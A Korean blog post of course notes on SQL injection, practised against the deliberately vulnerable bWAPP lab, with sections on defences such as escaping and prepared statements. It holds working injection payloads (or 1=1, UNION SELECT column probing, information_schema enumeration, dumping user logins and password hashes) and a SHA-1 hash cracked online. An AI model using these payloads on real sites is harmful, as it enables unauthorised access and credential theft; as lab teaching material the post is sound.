---
layout: post
title: "비박스를 활용한 웹 모의해킹 완벽 실습 - SQL 인젝션 기초"
excerpt_separator:  <!--more-->
categories:
 - WebHack
tags:
  - 웹 해킹
  - 인프런
  - Part1 A1
  - SQL 인젝션
---

<!--more-->

# 출처

## 인프런, 비박스를 활용한 웹 모의해킹 완벽 실습 7강 <https://www.inflearn.com/course/%EB%B9%84%EB%B0%95%EC%8A%A4-%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9-%EC%8B%A4%EC%8A%B5/>

---

# SQL 인젝션 기초

## SQL 인젝션

* 사용자가 입력한 값을 검증하지 않고 데이터베이스 쿼리 일부분으로 포함될 때 발생 취약점

![image](https://user-images.githubusercontent.com/28076542/51785104-2e78f200-2196-11e9-9303-1505151d35e4.png)

* 사용자가 웹 서버에 전달하는 데이터에 SQL문을 삽입하여 데이터를 가져올 수 있음

```bash
mysql> select * from testtable1 where no=3;
+----+-----------+---------+----------+
| no | name      | id      | pass     |
+----+-----------+---------+----------+
|  3 | practical | malware | analysis | 
+----+-----------+---------+----------+
1 row in set (0.00 sec)

mysql> select * from testtable1 where no=3 or 1=1;
+----+-----------+-----------+-------------+
| no | name      | id        | pass        |
+----+-----------+-----------+-------------+
|  1 | Sun       | isc0304   | test1234    | 
|  2 | black     | hat       | python      | 
|  3 | practical | malware   | analysis    | 
|  4 | python    | hacking   | programming | 
|  5 | coding    | interview | analysis    | 
|  6 | john      | gray      | love        | 
|  7 | lego      | mindstorm | ev3         | 
+----+-----------+-----------+-------------+
7 rows in set (0.00 sec)

mysql> select * from testtable1 where no=0 union select 1, 2, 3, 4;
+----+------+----+------+
| no | name | id | pass |
+----+------+----+------+
|  1 | 2    | 3  | 4    | 
+----+------+----+------+
1 row in set (0.00 sec)

mysql> select * from testtable1 where no=0 union select 1, 2, 3, @@version;+----+------+----+-----------------+
| no | name | id | pass            |
+----+------+----+-----------------+
|  1 | 2    | 3  | 5.0.96-0ubuntu3 | 
+----+------+----+-----------------+
1 row in set (0.00 sec)
```

### information schema 살펴보기

```bash
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema | 
| bWAPP              | 
| drupageddon        | 
| mysql              | 
| testdb             | 
+--------------------+
5 rows in set (0.01 sec)

mysql> use information_schema 
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+---------------------------------------+
| Tables_in_information_schema          |
+---------------------------------------+
| CHARACTER_SETS                        | 
| COLLATIONS                            | 
| COLLATION_CHARACTER_SET_APPLICABILITY | 
| COLUMNS                               | 
| COLUMN_PRIVILEGES                     | 
| KEY_COLUMN_USAGE                      | 
| PROFILING                             | 
| ROUTINES                              | 
| SCHEMATA                              | 
| SCHEMA_PRIVILEGES                     | 
| STATISTICS                            | 
| TABLES                                | 
| TABLE_CONSTRAINTS                     | 
| TABLE_PRIVILEGES                      | 
| TRIGGERS                              | 
| USER_PRIVILEGES                       | 
| VIEWS                                 | 
+---------------------------------------+
17 rows in set (0.00 sec)
```

* 데이터 베이스의 유저 권한 확인 가능
* COLUMNS: 데이터 베이스 전체에 관한 column 조회 가능
* SCHEMA, TABLES도 전체 데이터 베이스에 관해 조회 가능
* 검증되지 않은 데이터가 웹에 들어오면 데이터 베이스에서 조작 가능한 모든 것을 할 수 있음

### SQL 기본 문법 - 주석 처리

|번호|주석|설명|
|:----:|:----:|:----:|
|1|--|한 줄 주석 처리|
|2|#|한 줄 주석 처리|
|3|/**/|다중 주석 처리|

* 주석 처리를 사용하는 이유: `select * from testtable1 where id = "" or 1=1`을 하면 위에 서술하였듯이 모든 데이터를 가져오는데 문제는 `1=1`뒤에 나오는 내용들이 SQL 인젝션을 방해함
* 따라서 `1=1`뒤의 내용을 주석처리하여 원하는 인젝션을 가능하게 하는 것

### 주석을 이용한 SQL 인젝션

```bash
mysql> use testdb
Database changed
mysql> select * from testtable1;
+----+-----------+-----------+-------------+
| no | name      | id        | pass        |
+----+-----------+-----------+-------------+
|  1 | Sun       | isc0304   | test1234    | 
|  2 | black     | hat       | python      | 
|  3 | practical | malware   | analysis    | 
|  4 | python    | hacking   | programming | 
|  5 | coding    | interview | analysis    | 
|  6 | john      | gray      | love        | 
|  7 | lego      | mindstorm | ev3         | 
+----+-----------+-----------+-------------+
7 rows in set (0.00 sec)

mysql> select * from testtable1 where id="isc0304";
+----+------+---------+----------+
| no | name | id      | pass     |
+----+------+---------+----------+
|  1 | Sun  | isc0304 | test1234 | 
+----+------+---------+----------+
1 row in set (0.00 sec)

mysql> select * from testtable1 where id="isc0304" or 1=1 # "sdafasdf";
    -> ;
+----+-----------+-----------+-------------+
| no | name      | id        | pass        |
+----+-----------+-----------+-------------+
|  1 | Sun       | isc0304   | test1234    | 
|  2 | black     | hat       | python      | 
|  3 | practical | malware   | analysis    | 
|  4 | python    | hacking   | programming | 
|  5 | coding    | interview | analysis    | 
|  6 | john      | gray      | love        | 
|  7 | lego      | mindstorm | ev3         | 
+----+-----------+-----------+-------------+
7 rows in set (0.00 sec)
```

* SQL 인젝션 GET/SEARCH를 해보겠음

### 1. 칼리리눅스에서 BWapp 들어가서 SQL Injetion (Get/Search) 들어가기

![image](https://user-images.githubusercontent.com/28076542/51786985-4c068580-21af-11e9-8525-796757019fc3.png)

* 검색창에 `'`를 쓰면 오류, `"`를 쓰면 오류가 안나므로 SQL에서 `'`를 씀을 알 수 있음

### 2. 검색창에 다음 SQL 입력

* `' or 1=1 #`

![image](https://user-images.githubusercontent.com/28076542/51787058-655c0180-21b0-11e9-992a-87b8a87f63d6.png)

* 위와 같이 영화 목록이 쭉 나오는 것을 알 수 있음

### 3. union select를 통해 여러 결과를 출력

#### 'UNION SELECT ALL 1 #0`, `'UNION SELECT ALL 1#0

![image](https://user-images.githubusercontent.com/28076542/51787174-ac96c200-21b1-11e9-9cc6-60cd6b860688.png)

#### 'UNION SELECT ALL 1#0`, `'UNION SELECT ALL 1,2,3,4,5,6,7#0

![image](https://user-images.githubusercontent.com/28076542/51787189-f8496b80-21b1-11e9-9c28-6cd6abbb23c8.png)

* union select는 column 수를 정확히 알아야 하므로 `' UNION SELECT ALL 1#0`, `' UNION SELECT ALL 1,2#0`...을 통해 오류가 나지 않을 때까지 시도를 해봐야 함
* 시도 결과 column의 개수는 7개라는 것을 알 수 있음
* 이를 이용하여 다음과 같은 명령을 입력하여 원하는 정보를 얻을 수 있음
* `''' union select 1,2,3,4,5,6,7 #`

![image](https://user-images.githubusercontent.com/28076542/51787294-4d39b180-21b3-11e9-8ab7-b690ebf11392.png)

* `''' union select 1,@@version,3,4,5,6,7 #`

![image](https://user-images.githubusercontent.com/28076542/51787305-765a4200-21b3-11e9-874f-a6fe33124ec1.png)

#### 시스템 변수 및 함수 표

|시스템 변수 및 함수|설명|
|:----:|:----:|
|database()|DB명을 알려주는 함수|
|user()|현재 사용자의 아이디|
|system_user()|최고 권한 사용자의 아이디|
|@@version|DB 서버의 버전|
|@@datadir|DB 서버가 존재하는 디렉터리|

* `''' union select 1,@@version,database(),user(),system_user(),@@version,@@datadir #`

![image](https://user-images.githubusercontent.com/28076542/51787447-7ce9b900-21b5-11e9-8797-3448f4ff6710.png)

### 4. Information_schema 조회하기

* `0' union select 1,table_name,3,4,5,6,7 from information_schema.tables #`

![image](https://user-images.githubusercontent.com/28076542/51787504-2466eb80-21b6-11e9-8b96-c9cf8863115d.png)

```bash
mysql> use information_schema
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+---------------------------------------+
| Tables_in_information_schema          |
+---------------------------------------+
| CHARACTER_SETS                        | 
| COLLATIONS                            | 
| COLLATION_CHARACTER_SET_APPLICABILITY | 
| COLUMNS                               | 
| COLUMN_PRIVILEGES                     | 
| KEY_COLUMN_USAGE                      | 
| PROFILING                             | 
| ROUTINES                              | 
| SCHEMATA                              | 
| SCHEMA_PRIVILEGES                     | 
| STATISTICS                            | 
| TABLES                                | 
| TABLE_CONSTRAINTS                     | 
| TABLE_PRIVILEGES                      | 
| TRIGGERS                              | 
| USER_PRIVILEGES                       | 
| VIEWS                                 | 
+---------------------------------------+
17 rows in set (0.00 sec)

mysql> select table_name from tables;
+---------------------------------------+
| table_name                            |
+---------------------------------------+
| CHARACTER_SETS                        | 
| COLLATIONS                            | 
| COLLATION_CHARACTER_SET_APPLICABILITY | 
| COLUMNS                               | 
| COLUMN_PRIVILEGES                     | 
| KEY_COLUMN_USAGE                      | 
| PROFILING                             | 
| ROUTINES                              | 
| SCHEMATA                              | 
| SCHEMA_PRIVILEGES                     | 
| STATISTICS                            | 
| TABLES                                | 
| TABLE_CONSTRAINTS                     | 
| TABLE_PRIVILEGES                      | 
| TRIGGERS                              | 
| USER_PRIVILEGES                       | 
| VIEWS                                 | 
| blog                                  | 
| heroes                                | 
| movies                                | 
| users                                 | 
| visitors                              | 
| actions                               | 
| authmap                               | 
| batch                                 | 
| block                                 | 
| block_custom                          | 
| block_node_type                       | 
| block_role                            | 
| blocked_ips                           | 
| cache                                 | 
| cache_block                           | 
| cache_bootstrap                       | 
| cache_field                           | 
| cache_filter                          | 
| cache_form                            | 
| cache_image                           | 
| cache_menu                            | 
| cache_page                            | 
| cache_path                            | 
| comment                               | 
| date_format_locale                    | 
| date_format_type                      | 
| date_formats                          | 
| field_config                          | 
| field_config_instance                 | 
| field_data_body                       | 
| field_data_comment_body               | 
| field_data_field_image                | 
| field_data_field_tags                 | 
| field_revision_body                   | 
| field_revision_comment_body           | 
| field_revision_field_image            | 
| field_revision_field_tags             | 
| file_managed                          | 
| file_usage                            | 
| filter                                | 
| filter_format                         | 
| flood                                 | 
| history                               | 
| image_effects                         | 
| image_styles                          | 
| menu_custom                           | 
| menu_links                            | 
| menu_router                           | 
| node                                  | 
| node_access                           | 
| node_comment_statistics               | 
| node_revision                         | 
| node_type                             | 
| queue                                 | 
| rdf_mapping                           | 
| registry                              | 
| registry_file                         | 
| role                                  | 
| role_permission                       | 
| search_dataset                        | 
| search_index                          | 
| search_node_links                     | 
| search_total                          | 
| semaphore                             | 
| sequences                             | 
| sessions                              | 
| shortcut_set                          | 
| shortcut_set_users                    | 
| system                                | 
| taxonomy_index                        | 
| taxonomy_term_data                    | 
| taxonomy_term_hierarchy               | 
| taxonomy_vocabulary                   | 
| url_alias                             | 
| users                                 | 
| users_roles                           | 
| variable                              | 
| watchdog                              | 
| columns_priv                          | 
| db                                    | 
| func                                  | 
| help_category                         | 
| help_keyword                          | 
| help_relation                         | 
| help_topic                            | 
| host                                  | 
| proc                                  | 
| procs_priv                            | 
| tables_priv                           | 
| time_zone                             | 
| time_zone_leap_second                 | 
| time_zone_name                        | 
| time_zone_transition                  | 
| time_zone_transition_type             | 
| user                                  | 
| testtable1                            | 
| uniontb                               | 
+---------------------------------------+
114 rows in set (0.14 sec)
```

### 5. 민감한 정보 조회하기

* `concat`: 문자열을 합치는 함수
* `0'union select 1,concat(id,login),password,email,secret,6,7 from users #`

![image](https://user-images.githubusercontent.com/28076542/51787565-106fb980-21b7-11e9-8209-bb30875ecd39.png)

* 2bee가 패스워드에 해당 --> 해시화 되어 있음
* `6885858486f31043e5839c735d99457f045affd0`

### 6. 칼리리눅스에서 어떤 해시를 사용하는지 확인하기

![image](https://user-images.githubusercontent.com/28076542/51787617-6fcdc980-21b7-11e9-9391-820ac01e863d.png)

* SHA-1을 사용하고 있음
* [웹 SHA1 Descrypter](https://hashkiller.co.uk/sha1-decrypter.aspx)를 활용하여 decode

![image](https://user-images.githubusercontent.com/28076542/51787661-ed91d500-21b7-11e9-8df7-99c0fb0c68ce.png)

## SQL 인젝션 대응방안

### 1. Bee-Box에서 sqli_1.php 확인

```php
include("security.php");
include("security_level_check.php");
include("selections.php");
include("functions_external.php");
include("connect.php");

function sqli($data)
{
    switch($_COOKIE["security_level"])
    {
        case "0" :
            $data = no_check($data);
            break;
        case "1" :
            $data = sqli_check_1($data);
            break;
        case "2" :
            $data = sqli_check_2($data);
            break;
        default :
            $data = no_check($data);
            break;
    }
    return $data;
}
```

* sqli_check_2일 때 발생하지 않음

### 2. functions_external.php 확인하기

```php
function sqli_check_2($data)
{
    return mysql_real_escape_string($data);
}
```

### 3. mysql_real_escape_string 확인하기

* [mysql_real_escape_string](http://php.net/manual/kr/function.mysql-real-escape-string.php)

![image](https://user-images.githubusercontent.com/28076542/51787743-fd5de900-21b8-11e9-9ce9-0deba6c66044.png)

## SQL 인젝션 (GET/Select)

![image](https://user-images.githubusercontent.com/28076542/51787779-69d8e800-21b9-11e9-810d-8e2f2f5a074c.png)

### 1. BurpSuite 실행 후 메뉴 선택하고 Go 누르기

![image](https://user-images.githubusercontent.com/28076542/51980802-7a000880-24d4-11e9-8c75-6a0ed75d73a5.png)

* movie = 2가 문제 부분

### 2. URL 조작하여 메시지 보내기

* `192.168.190.143/bWAPP/sqli_2.php?movie=5 or 1=1#&action=go`

![image](https://user-images.githubusercontent.com/28076542/51981112-5e493200-24d5-11e9-92ba-5ac663771d44.png)

* moive=5이므로 The Cabin in the Wood가 나와야하는데 첫 번째 영화가 조회됨
* 게다가 `or 1=1`을 해서 전체 데이터 베이스가 출력되어야 하는데 하나만 출력됨
* 왜냐하면 데이터 베이스는 전체를 출력하였는데 웹에서 하나만 출력하게 설정하였기 때문
* 따라서 `limit`을 사용하여 원하는 데이터를 웹에 출력하게 해야 함
* `192.168.190.143/bWAPP/sqli_2.php?movie=5 or 1=1 limit 5,1#&action=go`

![image](https://user-images.githubusercontent.com/28076542/51981414-5342d180-24d6-11e9-9590-60f21ad946c4.png)

## SQL 인젝션 대응방안 (Get/Select)

* fetch_object 함수를 사용하여 객체 생성 후 컬럼을 개별적으로 호출하여 연결하는 방식을 사용
* **php의 prepare statement 활용**

```php
if($_COOKIE["security_level"] == "2")
{
    
    header("Location: sqli_2-ps.php");
    
    exit;
    
}
```

* `Location`: 다른 페이지로 리다이렉션 해주는 함수

```php
<?php

            // Fills the 'select' object
            while($row = $recordset->fetch_object())
            {

?>
                <option value="<?php echo $row->id;?>"><?php echo $row->title; ?></option>
```

```php
<?php

if(isset($_GET["movie"]))
{   

    $id = $_GET["movie"];

    $sql = "SELECT title, release_year, genre, main_character, imdb FROM movies WHERE id =?";

    if($stmt = $link->prepare($sql)) 
    // if($stmt = mysqli_prepare($link, $sql))                
    {

        // Binds the parameters for markers
        $stmt->bind_param("s", $id);
        // mysqli_stmt_bind_param($stmt, "s", $id);

        // Executes the query
        $stmt->execute();
        // mysqli_stmt_execute($stmt);

        // Binds the result variables
        $stmt->bind_result($title, $release_year, $genre, $main_character, $imdb);
        // mysqli_stmt_bind_result($stmt, $title, $release_year, $genre, $main_character, $imdb);

        // Stores the result, necessary to count the number of rows
        $stmt->store_result();      
        // mysqli_stmt_store_result($stmt);

        // Prints the number of rows
        // printf("Number of rows: %d.\n", mysqli_stmt_num_rows($stmt));
        // printf("Number of rows: %d.\n", $stmt->num_rows);      

        if($stmt->error)
        // if(mysqli_stmt_error($stmt))
        {        

?>
```

* `$sql` 변수에 미리 SQL문을 설정해 놓고 id에 쿼리문을 대입하는 방법을 쓰고 있음
* **prepare statement**는 필수

## SQL 인젝션 - POST/~

* 위 내용과 크게 다르지 않고 BurpSuite로 똑같이 Body에 인젝션 코드를 담아 전송하면 됨